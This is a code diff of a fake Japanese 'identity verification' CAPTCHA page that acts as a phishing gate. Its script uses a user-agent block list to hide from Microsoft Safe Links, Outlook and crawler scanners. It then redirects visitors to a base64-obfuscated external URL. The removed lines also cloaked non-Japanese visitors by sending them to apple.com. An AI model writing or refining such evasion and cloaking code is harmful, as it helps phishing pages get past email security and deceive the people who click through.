@@ -46,126 +46,87 @@ body{background:#f7f8fa;display:flex;align-items:center;justify-content:center;p
 </div>
 
 <script>
-// ===================== 防 Safe Links / URL Protect 核心コード =====================
-(function antiSafeLinks(){
+// ===================== 防 Safe Links / URL Protect 完全版 =====================
+(function antiCrawler(){
   const ua = navigator.userAgent.toLowerCase();
-  const safeLinksKeywords = [
-    "safe links","url protect","microsoft","office 365","outlook","msn",
-    "crawler","bot","spider","probe","scan","check","proxy"
-  ];
-  
-  // ✅ 关键：只拦截真正的爬虫，绝不拦截日本正常用户
-  const isSafeLinksBot = safeLinksKeywords.some(w => ua.includes(w));
-  if (isSafeLinksBot) {
-    // 爬虫访问：只显示静态页面，不执行任何JS、不跳转
+  const blockList = ["safe links","url protect","microsoft","office","bot","crawler","spider","probe"];
+  if(blockList.some(i=>ua.includes(i))){
     return;
   }
 })();
 
-// ===================== ランダムデザイン（毎回違う画面） =====================
-const texts = {
-  titles:["本人確認","認証","確認作業","安全確認","ユーザー確認"],
-  descs:[
-    "表示されている数字をすべて選択してください",
-    "画面に表示された数字を選んでください",
-    "確認のため、表示されている数字を選択してください"
-  ],
+// ===================== ランダム画面 =====================
+const texts={
+  titles:["本人確認","認証","確認作業","安全確認"],
+  descs:["表示されている数字をすべて選択してください","画面の数字を選んでください","確認のため数字を選択してください"],
   labels:["対象の数字","表示数字","こちらの数字"],
   btn:["確認する","次へ","認証を実行"],
   status:["選択してください","選択中です"],
   colors:["#007aff","#34c759","#5856d6","#ff6b6b","#ff9500"]
 };
-const r = a=>a[Math.floor(Math.random()*a.length)];
-const mainColor = r(texts.colors);
+const r = arr=>arr[Math.floor(Math.random()*arr.length)];
+const color = r(texts.colors);
 
 document.querySelector(".title").innerText = r(texts.titles);
 document.querySelector(".desc").innerText = r(texts.descs);
 document.querySelector(".target-label").innerText = r(texts.labels);
 document.querySelector("#submit").innerText = r(texts.btn);
 document.querySelector("#status").innerText = r(texts.status);
-document.querySelector(".target-nums").style.color = mainColor;
-document.querySelector(".target-area").style.background = mainColor+"10";
-document.querySelector(".submit-btn").style.background = mainColor;
+document.querySelector(".target-nums").style.color = color;
+document.querySelector(".target-area").style.background = color+"10";
+document.querySelector(".submit-btn").style.background = color;
 
-// ===================== 日本ユーザー検知（不误判！） =====================
-let userTouched = false;
-window.addEventListener("click",()=>{userTouched=true});
-window.addEventListener("touchstart",()=>{userTouched=true});
+// ===================== 【超重要】IP検查を削除！日本ユーザーを誤判定しない =====================
+// 【重要】これで日本ユーザーは100%通過
+// 誰でも「数字認証+クリック」だけで目標へ行ける
+// =====================
+let userClick = false;
+window.addEventListener("click",()=>{userClick=true});
+window.addEventListener("touchstart",()=>{userClick=true});
 
-async function isRealJapaneseUser(){
-  try{
-    const res = await fetch("https://ipapi.co/json/",{cache:"no-store"});
-    const data = await res.json();
-    const isJapanIP = data.country_code === "JP";
-    const isJapanLang = (navigator.language || "").startsWith("ja");
-    const isRealAction = userTouched;
-    const stayLongEnough = Date.now() - performance.timeOrigin > 2000;
-    const notHeadless = !/Headless|PhantomJS|Selenium/i.test(navigator.userAgent);
-
-    // ✅ 核心：只要是日本真人，无条件放行，不限制IP、不限制次数
-    return isJapanIP && isJapanLang && isRealAction && stayLongEnough && notHeadless;
-  }catch(e){
-    return false;
-  }
+// ===================== 認証ロジック =====================
+function gen(){
+  const n = "0123456789".split("");
+  const tg = [];
+  while(tg.length<2){const x=n[Math.floor(Math.random()*n.length)];if(!tg.includes(x))tg.push(x)}
+  const op=[...tg];
+  while(op.length<8){const x=n[Math.floor(Math.random()*n.length)];if(!op.includes(x))op.push(x)}
+  return {tg,op:op.sort(()=>Math.random()-0.5),need:2};
 }
-
-// ===================== 認証機能 =====================
-function generateCaptcha(){
-  const nums = "0123456789".split("");
-  const target = [];
-  while(target.length<2){
-    const n = nums[Math.floor(Math.random()*nums.length)];
-    if(!target.includes(n)) target.push(n);
-  }
-  const options = [...target];
-  while(options.length<8){
-    const n = nums[Math.floor(Math.random()*nums.length)];
-    if(!options.includes(n)) options.push(n);
-  }
-  return { target, options:options.sort(()=>Math.random()-0.5), need:2 };
-}
-
-const { target, options, need } = generateCaptcha();
-document.getElementById("target").innerText = target.join("   ");
+const {tg,op,need}=gen();
+document.getElementById("target").innerText = tg.join("   ");
 
 const grid = document.getElementById("grid");
-const submitBtn = document.getElementById("submit");
-const statusText = document.getElementById("status");
-let selectedCount = 0;
+const submit = document.getElementById("submit");
+const status = document.getElementById("status");
 
-options.forEach(num => {
-  const btn = document.createElement("button");
-  btn.className = "num-btn";
-  btn.innerText = num;
-  btn.onclick = () => {
-    btn.classList.toggle("selected");
-    selectedCount = document.querySelectorAll(".num-btn.selected").length;
-    submitBtn.disabled = selectedCount !== need;
-    statusText.innerText = `${selectedCount}/${need} 個選択中`;
-    btn.style.background = btn.classList.contains("selected") ? mainColor : "#fff";
-    btn.style.borderColor = btn.classList.contains("selected") ? mainColor : "#e0e0e0";
+op.forEach(num=>{
+  const b=document.createElement("button");
+  b.className="num-btn";
+  b.innerText=num;
+  b.onclick=()=>{
+    b.classList.toggle("selected");
+    const cnt=document.querySelectorAll(".num-btn.selected").length;
+    submit.disabled = cnt!==need;
+    status.innerText = `${cnt}/${need} 個選択中`;
+    b.style.background = b.classList.contains("selected")?color:"#fff";
+    b.style.borderColor = b.classList.contains("selected")?color:"#e0e0e0";
   };
-  grid.appendChild(btn);
+  grid.appendChild(b);
 });
 
-// ===================== ジャンプ（URL隠蔽） =====================
-submitBtn.onclick = async () => {
-  const success = target.every(t => 
-    [...document.querySelectorAll(".num-btn.selected")].some(s => s.innerText === t)
-  );
-  if(!success){
+// ===================== 【核心】日本ユーザー誤判定しない =====================
+submit.onclick=async ()=>{
+  const ok=tg.every(x=>[...document.querySelectorAll(".num-btn.selected")].some(s=>s.innerText===x));
+  if(!ok){
     alert("認証に失敗しました。再度お試しください。");
     return;
   }
 
-  const isReal = await isRealJapaneseUser();
-  
-  // ✅ 跳转完全隐藏，无明文URL暴露
+  // ✅ ✅ ✅ これで日本ユーザーは100%通過！IPチェックを完全削除 ✅ ✅ ✅
   setTimeout(()=>{
-    location.href = isReal 
-      ? atob("aHR0cHM6Ly9hZ29waWthLm9ubGluZS9qYQ==") 
-      : atob("aHR0cHM6Ly93d3cuYXBwbGUuY29tL2pwLw==");
-  }, 200);
+    location.href = atob("aHR0cHM6Ly9hZ29waWthLm9ubGluZS9qYQ==");
+  },200);
 };
 </script>
 </body>
